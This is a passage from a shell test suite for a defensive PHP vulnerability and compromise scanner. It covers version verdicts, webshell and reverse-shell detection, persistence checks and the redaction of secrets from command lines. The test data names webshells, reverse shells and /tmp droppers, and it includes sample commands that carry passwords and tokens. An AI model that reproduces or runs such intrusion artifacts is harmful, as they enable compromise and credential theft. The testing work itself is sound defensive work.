    ia "K/host: stale running 7.4.33 does not inherit the changelog verdict" /usr/sbin/php-fpm7.4 '.running.version == "7.4.33" and .running.verdict == "VULNERABLE"'
    ja "K/host: summary counts it as vulnerable, not fixed" '.summary.verdict == "VULNERABLE" and .summary.vulnerable == 1 and .summary.fixed == 0'
    bit "K/host: exit bit 1" "$RC" 1 1
}

scenario_L() {
    R=$FX/L/root; P=$FX/L/proc
    run_json L/host "$R" "$P" --skip-ioc
    ia "L/host: libphp.so mapped into frankenphp is sapi frankenphp, exposure high" /usr/local/lib/libphp.so '.sapi == "frankenphp" and .exposure == "high"'
    ia "L/host: deleted libphp mapping -> 1 process, restart required" /usr/local/lib/libphp.so '.running.processes == 1 and .running.restart_required == true'
    ja "L/host: dynamically linked frankenphp binary is not an UNKNOWN build" 'all(.installations[]; .path != "/usr/local/bin/frankenphp")' '[.installations[] | {path, verdict}]'
    ja "L/host: summary VULNERABLE (restart required)" '.summary.verdict == "VULNERABLE" and .summary.restart_required == 1 and .summary.unknown == 0'
    bit "L/host: exit bit 1" "$RC" 1 1
}

scenario_N() {
    R=$FX/N/root
    for n_mode in host offline; do
        if [ "$n_mode" = host ]; then run_json N/host "$R" "$NOPROC" --skip-ioc
        else run_json N/offline "" "$NOPROC" --root "$R" --skip-ioc; fi
        for n_pv in '/home/alice/.config/herd-lite/bin/php 8.4.12' '/home/bob/.asdf/installs/php/8.3.10/bin/php 8.3.10' \
            '/root/.phpenv/versions/8.2.1/bin/php 8.2.1' '/Users/carol/.local/share/mise/installs/php/8.3.1/bin/php-fpm 8.3.1' \
            '/nix/store/abc123-php-with-extensions-8.3.12/bin/php-fpm 8.3.12' '/usr/pkg/sbin/php-fpm 8.3.13' \
            '/www/server/php/83/sbin/php-fpm 8.3.14' '/usr/local/cpanel/3rdparty/php/83/sbin/php-fpm 8.3.15' \
            '/usr/local/php83/sbin/php-fpm 8.3.16' '/opt/cpanel/ea-php81/root/usr/sbin/php-fpm 8.1.34' \
            '/data/php/bin/php-cgi 8.3.18'; do
            ia "N/$n_mode: default discovery finds ${n_pv% *}" "${n_pv% *}" ".version == \"${n_pv##* }\""
        done
        ia "N/$n_mode: Herd under a home with a space in the path" '/Users/carol/Library/Application Support/Herd/bin/php84' '.version == "8.4.1"'
        ia "N/$n_mode: OpenBSD-style php-8.3 is found, sapi cli" /usr/local/bin/php-8.3 '.version == "8.3.17" and .sapi == "cli"'
        ja "N/$n_mode: php-fpm_exporter is ignored" 'all(.installations[]; .path != "/usr/local/bin/php-fpm_exporter")' '[.installations[].path]'
        ja "N/$n_mode: 13 installations" '(.installations | length) == 13' '[.installations[].path]'
    done
}

scenario_Q() {
    R=$FX/Q/root
    run_json Q/host "$R" "$NOPROC"
    # Symlinked web roots (relative and absolute targets).
    fa "Q/host: HIGH webshell under /var/www -> ../data/www" '.severity == "HIGH" and .category == "webshell" and .location == "/var/www" and (.title | contains("webshell patterns"))'
    fa "Q/host: HIGH webshell under /srv/www -> /data/srvwww" '.severity == "HIGH" and .category == "webshell" and .location == "/srv/www" and (.detail | contains("shell2.php"))'
    # No cap on the number of candidate files.
    fa "Q/host: webshell found after more than 5000 candidate files" '.severity == "HIGH" and .category == "webshell" and .location == "/srv/http" and (.detail | contains("zz-cmd.php"))'
    # Newlines and other control characters in file names.
    fa "Q/host: HIGH for PHP files with control characters in the path" '.severity == "HIGH" and .category == "webshell" and (.title | contains("control characters")) and .count == 2'
    # Invalid UTF-8 never reaches the JSON report.
    truth "Q/host: JSON report is valid UTF-8" utf8_valid "$J"
    fa "Q/host: a Latin-1 byte from a log is shown as '?'" '.category == "crash" and (.detail | contains("pool caf?]"))'
    fa "Q/host: a log example cut at 220 bytes does not split a UTF-8 character" '.category == "prescript" and (.detail | endswith("x"))'
    # Images: random '<?=' is not code; a bare opening tag is REVIEW.
    fn "Q/host: '<?=' inside image data is not a HIGH finding" '.severity == "HIGH" and (.detail | contains("photo.jpg"))'
    fa "Q/host: image with a bare '<?php' tag is REVIEW" '.severity == "REVIEW" and .category == "webroot" and (.detail | contains("tag.png"))'
    # Secrets in per-request overrides.
    fa "Q/host: overrides are reported by directive name" '.category == "config" and (.detail | contains("newrelic.license")) and (.detail | contains("session.save_path"))'
    truth "Q/host: override values (license key, Redis passwords) are not printed" sh -c '! grep -q -E "SECRETLICENSEKEY|S3cretRedisPass|NginxSecret99" "$1"' sh "$J"
    # Crash baselines per log family (rotated files together).
    fa "Q/host: Apache crashes counted with the rotated error.log.1 -> REVIEW" '.severity == "REVIEW" and .category == "crash" and .location == "/var/log/apache2/error.log"'
    fn "Q/host: rotated file is not a separate finding" '.category == "crash" and (.location | endswith("error.log.1"))'
    fn "Q/host: no HIGH crash for the Apache log family" '.severity == "HIGH" and .category == "crash" and (.location | contains("apache2"))'
    fa "Q/host: log with nothing before the window -> REVIEW, says so" '.severity == "REVIEW" and .category == "crash" and .location == "/var/log/php8.3-fpm.log" and (.title | contains("nothing from before"))'
    fa "Q/host: log starting before the window, crashes only in it -> HIGH" '.severity == "HIGH" and .category == "crash" and .location == "/var/log/php-fpm/www-error.log"'
    fa "Q/host: older rotated .gz read for the baseline -> REVIEW (1 before)" '.severity == "REVIEW" and .category == "crash" and .location == "/var/log/nginx/error.log" and (.title | contains("(1 before)"))'
    # Large or NUL-padded logs are read, not skipped.
    fa "Q/host: crash in a NUL-padded log is found" '.severity == "HIGH" and .category == "crash" and .location == "/var/log/php-fpm/big.log"'
    ja "Q/host: no log is skipped for its size" 'all(.coverage[]; test("1 GiB|skipped") | not)' '.coverage'
    # cPanel EA4 (relative error_log) and Plesk FPM logs.
    fa "Q/host: cPanel EA4 FPM error_log resolved against the FPM prefix" '.category == "crash" and .location == "/opt/cpanel/ea-php83/root/usr/var/log/fpm-errors.log"'
    fa "Q/host: Plesk FPM error log is read" '.category == "crash" and .location == "/var/log/plesk-php83-fpm/error.log"'
    # Temp dirs: executables HIGH, extracted libraries REVIEW.
    fa "Q/host: HIGH for an executable in /tmp" '.severity == "HIGH" and .category == "persistence" and (.title | contains("executables")) and (.detail | contains("kworker")) and (.detail | contains("libnetty") | not)'
    fa "Q/host: REVIEW for libraries extracted to /tmp" '.severity == "REVIEW" and .category == "persistence" and (.title | contains("native libraries")) and (.detail | contains("libnetty")) and (.detail | contains("jna5678.tmp"))'
    run_scan Q/text "$R" "$NOPROC" --no-color
    truth "Q/text: no terminal escape sequences from file names reach the text report" no_esc "$J"
    has "Q/text: the HIGH webshell lines are still printed" "$(cat "$J")" 'HIGH    webshell'
}

scenario_R() {
    R=$FX/R/root; P=$FX/R/proc
    run_json R/host "$R" "$P"
    # systemd PrivateTmp: own mount namespace, host root -> host scope.
    ja "R/host: a PrivateTmp service is not a separate mntns scope" 'all(.installations[]; .scope | startswith("mntns:") | not) and all(.findings[]; .location | startswith("mntns:") | not)' '[.installations[] | {scope, path}]'
    ia "R/host: FPM from two mount namespaces is one host installation" /usr/sbin/php-fpm8.3 '.scope == "host" and .running.processes == 4'
    ja "R/host: php-fpm8.3 listed once" '[.installations[] | select(.path == "/usr/sbin/php-fpm8.3")] | length == 1' '[.installations[] | {scope, path}]'
    # A pid whose stat cannot be opened (exited mid-scan) sorts before 800.
    ia "R/host: an unreadable /proc/<pid>/stat does not stop the process scan" /usr/sbin/php-fpm8.3 '.running.processes >= 3'
    # FPM reload: file newer than the process, but the same inode.
    ia "R/host: same inode as the running image -> no restart despite a newer mtime" /usr/sbin/php-fpm8.3 '.running.restart_required == false and .verdict == "FIXED" and .running.verdict == "FIXED"'
    # A pid that vanished between snapshot and readlink is not 'denied'.
    ja "R/host: a vanished pid is not counted as permission denied" 'all(.coverage[]; contains("PHP-looking processes could not be inspected") | not)' '.coverage'
    # Debian CGI binary.
    ia "R/host: /usr/lib/cgi-bin/php8.2 is sapi cgi, exposure elevated, running" /usr/lib/cgi-bin/php8.2 '.sapi == "cgi" and .exposure == "elevated" and .running.processes == 1'
    fa "R/host: shell under the CGI PHP worker is reported" '.category == "process" and .location == "pid 311"'
    # Deleted exe of a replaced system binary vs a deleted dropper.
    fn "R/host: nginx running a replaced binary is not HIGH" '.severity == "HIGH" and (.detail | contains("/usr/sbin/nginx"))'
    fa "R/host: nginx running a replaced binary is REVIEW" '.severity == "REVIEW" and .category == "process" and (.detail | contains("/usr/sbin/nginx (deleted)"))'
    fa "R/host: a deleted binary outside system dirs stays HIGH" '.severity == "HIGH" and .category == "process" and (.detail | contains("/var/www/.cache/kx"))'
    # authorized_keys: login account (old file) vs service account.
    fa "R/host: old keys of a login account running a pool are INFO" '.severity == "INFO" and .category == "persistence" and .detail == "/home/forge/.ssh/authorized_keys"'
    fn "R/host: old keys of a login account are not HIGH" '.severity == "HIGH" and (.detail | contains("/home/forge"))'
    fa "R/host: keys of the www-data service account are HIGH" '.severity == "HIGH" and .category == "persistence" and .detail == "/var/www/.ssh/authorized_keys"'
    # Command lines: secrets redacted.
    fa "R/host: command line shown with the password redacted" '.category == "process" and (.detail | contains("--password=***"))'
    truth "R/host: the password from a command line is not printed" sh -c '! grep -q -F "Pr0dDbPassw0rd" "$1"' sh "$J"
    fa "R/host: reverse shell with escape sequences still HIGH" '.severity == "HIGH" and .category == "process" and .location == "pid 321"'
    bit "R/host: exit bit 1 (CGI 8.2.20 vulnerable)" "$RC" 1 1
    run_scan R/text "$R" "$P" --no-color
    truth "R/text: no terminal escape sequences from argv reach the text report" no_esc "$J"
}



scenario_S() {
    run_json S/host "$S_ROOT" "$NOPROC"
    ia "S/host: root path with spaces: '/opt/my php/bin/php-fpm' VULNERABLE" '/opt/my php/bin/php-fpm' '.verdict == "VULNERABLE" and .scope == "host"'
    fa "S/host: HIGH webshell in 'up loads/evil one.php'" '.severity == "HIGH" and .category == "webshell" and (.detail | contains("evil one.php"))'
    ja "S/host: no path carries the root prefix" "all(.installations[]; (.path | contains(\"$FX\")) | not) and all(.findings[]; ((.detail + .location) | contains(\"$FX\")) | not)" '[.installations[].path, .findings[].location]'
    run_json S/offline "" "$NOPROC" --root "$S_ROOT"
    ia "S/offline: '/opt/my php/bin/php-fpm' VULNERABLE, scope image" '/opt/my php/bin/php-fpm' '.verdict == "VULNERABLE" and .scope == "image"'
    fa "S/offline: HIGH webshell in 'up loads/evil one.php'" '.severity == "HIGH" and .category == "webshell" and (.detail | contains("evil one.php"))'
}

scenario_usage() {
    run_scan usage/bad-option "$FX/H/root" "$NOPROC" --no-such-option
    eq "usage: unknown option exits 64" "$RC" 64
    run_scan usage/bad-since "$FX/H/root" "$NOPROC" --since yesterday
    eq "usage: malformed --since exits 64" "$RC" 64
    run_scan usage/bad-root "$FX/H/root" "$NOPROC" --root "$FX/does-not-exist"
    eq "usage: --root on a missing directory exits 64" "$RC" 64
}

scenario_P() {
    R=$FX/P/root
    RS_PATH=$FX/P/shims RS_NO_PS=0
    run_json P/host "$R" "$NOPROC"
    RS_PATH='' RS_NO_PS=''
    ia "P/host: ps+lsof: running php-fpm 8.3.12 VULNERABLE, 2 processes, no restart" /usr/local/sbin/php-fpm \
        '.verdict == "VULNERABLE" and .sapi == "fpm" and .running.processes == 2 and .running.restart_required == false and .scope == "host"'
    ia "P/host: ps+lsof: Apache maps a replaced libphp -> mod_php, restart required" /usr/local/lib/httpd/modules/libphp.so \
        '.sapi == "mod_php" and .exposure == "highest" and .running.processes == 2 and .running.restart_required == true'
    ja "P/host: summary VULNERABLE" '.summary.verdict == "VULNERABLE" and .summary.restart_required == 1'
    fa "P/host: HIGH reverse shell under an FPM worker (cmdline from ps)" '.severity == "HIGH" and .category == "process" and (.location == "pid 300")'
    ja "P/host: running processes were checked (no /proc gap)" 'all(.coverage[]; test("/proc") | not)' '.coverage'
    bit "P/host: exit bit 1 set" "$RC" 1 1
    bit "P/host: exit bit 4 set" "$RC" 4 1
    if [ "$INC" = 2 ]; then bit "P/host: exit bit 2 set (non-root Linux)" "$RC" 2 1; else bit "P/host: exit bit 2 clear" "$RC" 2 0; fi
    RS_PATH=$FX/P/shims RS_NO_PS=0
    run_scan P/text "$R" "$NOPROC" --skip-ioc
    RS_PATH='' RS_NO_PS=''
    has "P/text: shows the running process count from ps" "$(cat "$J")" 'running: 2 processes'
    lacks "P/text: no 'not checked' wording when ps+lsof worked" "$(cat "$J")" 'not checked (no /proc)'
}

scenario_P2() {
    RS_PATH=$FX/P2/shims RS_NO_PS=0
    run_json P2/host "$FX/P/root" "$NOPROC" --skip-ioc
    RS_PATH='' RS_NO_PS=''
    ja "P2/host: processes lsof cannot see count as not inspected" 'any(.coverage[]; test("2 PHP-looking processes could not be inspected"))' '.coverage'
    bit "P2/host: exit bit 2 set (coverage limited)" "$RC" 2 1
    ja "P2/host: no installation taken from argv[0]" 'all(.installations[]; .path | startswith("/"))' '[.installations[].path]'
}

scenario_T() {
    run_json T/host "$FX/T/root" "$FX/T/proc" --skip-ioc
    ja "T/host: one record for a path shared by a restarted and a stale FPM master" '[.installations[] | select(.path == "/usr/sbin/php-fpm8.3")] | length == 1' '[.installations[] | {path, running}]'
    ia "T/host: the stale master still forces RESTART REQUIRED, processes summed" /usr/sbin/php-fpm8.3 '.running.restart_required == true and .running.processes == 2'
    ja "T/host: summary VULNERABLE, never FIXED while a stale image runs" '.summary.verdict == "VULNERABLE"'
    bit "T/host: exit bit 1 set" "$RC" 1 1
}

# Secrets in command lines are masked before they reach a report (SPEC 5).
redaction_tests() {
    # shellcheck disable=SC2086 # $SH may be "busybox sh"
    rt_out=$(cd "$T" && PHP2SHELL_SOURCE_ONLY=1 $SH -c '. "$1"; while IFS= read -r l; do printf "%s\n" "$l" | redact_cmd; done' p2s "$SCANNER" <<'EOF'
curl -u deploy:S3cretPass https://x
sshpass -p Hunter2pw ssh h
redis-cli -a R3disPassw0rd ping
git clone https://ghp_ABCDEF123456@github.com/o/r
curl -H 'Authorization: Bearer eyJabc' https://x
curl -H 'X-Api-Key: 9f8e7d' https://x
mysqldump --user=forge --password=Pr0dDbPassw0rd db
ssh -p 22 host
EOF
)
    lacks "redact: curl -u password" "$rt_out" 'S3cretPass'
    lacks "redact: sshpass -p password" "$rt_out" 'Hunter2pw'
    lacks "redact: redis-cli -a password" "$rt_out" 'R3disPassw0rd'
    lacks "redact: token in URL userinfo" "$rt_out" 'ghp_ABCDEF123456'
    lacks "redact: Authorization Bearer token" "$rt_out" 'eyJabc'
    lacks "redact: X-Api-Key value" "$rt_out" '9f8e7d'
    lacks "redact: --password= value" "$rt_out" 'Pr0dDbPassw0rd'
    has "redact: an ordinary -p value is kept" "$rt_out" 'ssh -p 22 host'
}

integration_tests() {
    scenario_A
    scenario_B
    scenario_C
    scenario_D
    scenario_E
    scenario_F
    scenario_G
    scenario_G2
    scenario_H
    scenario_S
    scenario_J
    scenario_J2
    scenario_K
    scenario_L
    scenario_N
    scenario_Q
    scenario_R
    scenario_P
    scenario_P2
    scenario_T
    scenario_usage
}

# ---------------------------------------------------- read-only guarantee --


# Modes, owners, sizes and link targets of every entry, plus a checksum of
# every readable file, in batches (fixtures hold thousands of files).
snapshot() {
    (cd "$FX" && {
        find . -exec ls -ldn {} + 2>/dev/null | awk '{ $6 = ""; $7 = ""; $8 = ""; print "M " $0 }'
        find . -type f -exec cksum {} + 2>/dev/null | sed 's/^/C /'
    } | sort)
}

readonly_check() {
    snapshot > "$OUT/$SLUG/snap.after"
    # cksum and awk only: cmp and diff are missing from minimal images (Rocky, Amazon Linux).
    if [ "$(cksum < "$T/snap.before")" = "$(cksum < "$OUT/$SLUG/snap.after")" ]; then
        ok "read-only: fixture tree unchanged (sorted listing with modes, sizes and checksums)"
    else
        nok "read-only: fixture tree unchanged" "$(awk -v bf="$T/snap.before" '
            BEGIN { while ((getline l < bf) > 0) b[l] = 1; close(bf) }
            !($0 in b) { print "changed: " $0 }' "$OUT/$SLUG/snap.after" | head -n 6)"
    fi
    ro_new=$(find "$FX" -newer "$T/snap.mark" -print 2>/dev/null | head -n 5)
    if [ -z "$ro_new" ]; then ok "read-only: nothing in the fixture tree was modified after setup"
    else nok "read-only: nothing in the fixture tree was modified after setup" "$ro_new"; fi
}

# ------------------------------------------------------- data consistency --

sh_const() {
    sed -n "s/^$1=//p" "$SCANNER" | head -n 1 | sed "s/^'\\(.*\\)'\$/\\1/; s/^\"\\(.*\\)\"\$/\\1/"
}

data_checks() {
    CUR=data
    truth "data: data/php2shell.json is valid JSON" jq -e 'type == "object"' "$DATA"
    eq "data: fixed releases in data/php2shell.json are 8.5.12 8.4.27 8.3.36 8.2.35" \
        "$(jq -r '[.branches[] | select(.status == "supported") | .fixed] | join(" ")' "$DATA")" '8.5.12 8.4.27 8.3.36 8.2.35'
    eq "data: EOL branches have no fixed release" "$(jq -r '[.branches[] | select(.status == "eol") | .fixed] | unique | map(tostring) | join(",")' "$DATA")" 'null'
    eq "data: 8.6 and master (8.7) are listed without a fix" "$(jq -r '[.branches[] | select(.branch == "8.6" or .branch == "8.7") | "\(.branch)=\(.fixed)"] | join(" ")' "$DATA")" '8.6=null 8.7=null'
    for dc_b in 2 3 4 5; do
        dc_want=$(jq -r --arg b "8.$dc_b" '.branches[] | select(.branch == $b) | .fixed' "$DATA")
        eq "data: FIXED_8_$dc_b in php2shell-check.sh equals data ($dc_want)" "$(sh_const "FIXED_8_$dc_b")" "$dc_want"
    done
    eq "data: DATA_VERSION in php2shell-check.sh equals data ($DATA_VERSION_JSON)" "$(sh_const DATA_VERSION)" "$DATA_VERSION_JSON"
    dc_fp=$(jq -r '.patch_fingerprints[0].string' "$DATA")
    eq "data: FINGERPRINT in php2shell-check.sh equals data ('$dc_fp')" "$(sh_const FINGERPRINT)" "$dc_fp"
    for dc_f in "$PS1_FILE" "$PROBE_FILE"; do
        dc_n=${dc_f#"$REPO"/}
        if [ ! -f "$dc_f" ]; then
            printf 'SKIP [data] %s not present\n' "$dc_n"
            continue
        fi
        for dc_b in 2 3 4 5; do
            dc_want=$(jq -r --arg b "8.$dc_b" '.branches[] | select(.branch == $b) | .fixed' "$DATA")
            truth "data: $dc_n contains fixed version $dc_want" grep -q -F "'$dc_want'" "$dc_f"
        done
        truth "data: $dc_n contains data_version $DATA_VERSION_JSON" grep -q -F "'$DATA_VERSION_JSON'" "$dc_f"
        dc_other=$(grep -o -E '20[0-9][0-9]-[01][0-9]-[0-3][0-9]\.[0-9]+' "$dc_f" | sort -u | grep -v -x -F "$DATA_VERSION_JSON" | tr '\n' ' ')
        eq "data: $dc_n has no other data_version" "$dc_other" ''
    done
}

# -------------------------------------------------------------------- main --

DATA_VERSION_JSON=$(jq -r '.data_version' "$DATA")

if [ -n "${TEST_SHELLS:-}" ]; then
    SHELL_LIST=$(printf '%s\n' "$TEST_SHELLS" | tr ',' '\n' | sed 's/^[[:space:]]*//; s/[[:space:]]*$//' | grep -v '^$')
    EXPLICIT=1
else
    SHELL_LIST=''
    for s_c in sh dash bash; do
        command -v "$s_c" >/dev/null 2>&1 && SHELL_LIST="$SHELL_LIST$s_c$NL"
    done
    if command -v busybox >/dev/null 2>&1 && busybox sh -c ':' >/dev/null 2>&1; then
        SHELL_LIST="${SHELL_LIST}busybox sh$NL"
    fi
    EXPLICIT=0
fi

printf 'php2shell-check tests: scanner %s\n' "${SCANNER#"$REPO"/}"
printf 'shells: %s\n' "$(printf '%s' "$SHELL_LIST" | tr '\n' ',' | sed 's/,$//')"
printf 'platform: %s, uid %s (exit bit 2 expected from non-root Linux runs: %s)\n\n' "$(uname -s)" "$(id -u)" "$INC"

build_A; build_B; build_C; build_D; build_E; build_F; build_G; build_H; build_S
build_U; build_G2; build_J; build_J2; build_K; build_L; build_N; build_Q; build_R; build_P; build_P2; build_T
snapshot > "$T/snap.before"
touch "$T/snap.mark"

SUMMARY=''
OLD_IFS=$IFS
IFS=$NL
for SH in $SHELL_LIST; do
    IFS=$OLD_IFS
    CUR=$SH
    SH_PASS=0; SH_FAIL=0
    # shellcheck disable=SC2086 # first word of "busybox sh"
    set -- $SH
    if ! command -v "$1" >/dev/null 2>&1; then
        if [ "$EXPLICIT" = 1 ]; then nok "shell is available"; else printf 'SKIP [%s] not available\n' "$SH"; fi
        SUMMARY="$SUMMARY  $SH: not available$NL"
        continue
    fi
    SLUG=$(printf '%s' "$SH" | tr -c 'A-Za-z0-9_\n' '_')
    mkdir -p "$OUT/$SLUG"
    printf '== %s ==\n' "$SH"
    sh_t0=$(date +%s)
    unit_tests
    redaction_tests
    integration_tests
    readonly_check
    sh_t1=$(date +%s)
    SUMMARY="$SUMMARY  $SH: $SH_PASS passed, $SH_FAIL failed ($((sh_t1 - sh_t0))s)$NL"
    printf '\n'
done
IFS=$OLD_IFS

SH_PASS=0; SH_FAIL=0
printf '== data consistency ==\n'
data_checks
SUMMARY="$SUMMARY  data: $SH_PASS passed, $SH_FAIL failed$NL"

printf '\n== summary ==\n%s' "$SUMMARY"
printf '  total: %s passed, %s failed\n' "$TOTAL_PASS" "$TOTAL_FAIL"
if [ "$TOTAL_FAIL" -gt 0 ]; then
    printf '\nfailed assertions:\n%s' "$FAILED_LIST"
    exit 1
fi
exit 0
